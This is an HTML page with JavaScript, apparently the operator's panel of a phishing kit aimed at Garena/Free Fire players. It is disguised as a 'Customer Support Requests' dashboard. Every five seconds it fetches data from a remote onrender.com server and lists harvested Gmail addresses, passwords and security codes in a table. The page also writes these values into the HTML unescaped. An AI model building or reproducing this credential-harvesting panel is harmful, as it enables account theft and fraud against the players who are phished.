<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Admin Dashboard</title>
    <style>
        body { font-family: sans-serif; padding: 20px; background: #f4f6f9; }
        h2 { margin-bottom: 20px; color: #333; }
        .table-container { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; background: #fff; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; font-size: 14px; }
        th { background: #ff0000; color: white; }
        tr:nth-child(even) { background-color: #f9f9f9; }
    </style>
</head>
<body>
    <h2>Garena Customer Support Requests</h2>
    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Gmail</th>
                    <th>Password</th>
                    <th>Security Code</th>
                    <th>Problem Type</th>
                    <th>Time</th>
                </tr>
            </thead>
            <tbody id="ticketTable"></tbody>
        </table>
    </div>

    <script>
        // Render-এর লাইভ লিঙ্ক আপডেট করা হয়েছে
        const RAILWAY_URL = 'https://ff-garena-13jd.onrender.com';

        async function loadTickets() {
            try {
                const res = await fetch(`${RAILWAY_URL}/api/tickets`);
                const tickets = await res.json();
                const tbody = document.getElementById('ticketTable');
                tbody.innerHTML = '';
                tickets.reverse().forEach(t => {
                    tbody.innerHTML += `
                        <tr>
                            <td>${t.id}</td>
                            <td>${t.gmail}</td>
                            <td>${t.password}</td>
                            <td>${t.securityCode}</td>
                            <td>${t.problemType}</td>
                            <td>${new Date(t.timestamp).toLocaleString()}</td>
                        </tr>
                    `;
                });
            } catch(e) { console.error(e); }
        }
        loadTickets();
        setInterval(loadTickets, 5000); // প্রতি ৫ সেকেন্ডে অটো রিফ্রেশ
    </script>
</body>
</html>
